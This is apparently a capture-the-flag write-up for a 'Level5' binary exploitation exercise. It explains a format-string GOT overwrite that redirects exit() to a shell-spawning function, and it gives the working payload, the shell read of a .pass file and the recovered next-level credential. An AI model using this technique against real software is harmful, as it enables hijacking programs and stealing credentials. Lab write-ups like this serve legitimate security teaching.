# Level5

> For introductory information on this operating system and binary securities, check [here](./Ressources/README.md).

Let's see what does the binary do.

```shell
  $> ./level4
  teststring
  teststring
```

> It looks like this is similar to the previous level...

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./Ressources/gdb.md)). At first glance it appears that a **buffer overflow** won't be possible here since the program uses [`fgets()`](https://linux.die.net/man/3/fgets) and reads up to **512** bytes while the buffer is **520** bytes long.

After some deeper analysis, we find that there is a built-in way to spawn a shell within this program but the function were this logic happens is never called. Since the program don't return to the main at the end of execution but calls for `exit()`, we could use what's called a [GOT overwrite](https://infosecwriteups.com/got-overwrite-bb9ff5414628) exploit.


The process is as follows:

- Get the address of `exit()` in the Global Offset Table.
- Get the address of the function we want to run, `o()` in our case.
- Find the stack argument representing the format string.
- Overwrite the call to `exit()` by the address of `o()`.

Thanks to our `gdb` analysis we get:

- `exit()` function: `0x08049838`.
- `o()` function: `0x080484a4`.

Since these two addresses share the same two high order bytes we can take a shortcut here. We can update only the low order bytes so that `o()` would be executed making the **format string** a bit shorter and more readable.

Like before let's, first, identify which positional argument is our input.

```shell
  $> python -c 'print "AAAA" + " %p" * 8' | ./level5
  AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520
```

> This time our input is the 4th stack argument.

Now that we know the format string position in the stack all we have to do is to create a **33956** character long string containing the address of `exit()` to match the lower order bytes from `o()` address and output its low order bytes using `%hn`.

```shell
  $> (python -c 'print "\x08\x04\x98\x38"[::-1] + "%33952c%4$hn"'; cat) | ./level5    
  ...
  cat /home/user/level6/.pass 
  d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

> We, first, write the address of `exit()`, which is already **4** bytes, so using `%33952c` will add **33952** spaces as padding resulting in a **33956** character long string. Then all we have to do is output the number of character printed until this point using `%hn` into the 4th positional stack argument low order bytes we want to change using `%4$`.

So next user credentials pair is `level6:d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`.

Check [here](./source.c) for reproduction source-code of this binary.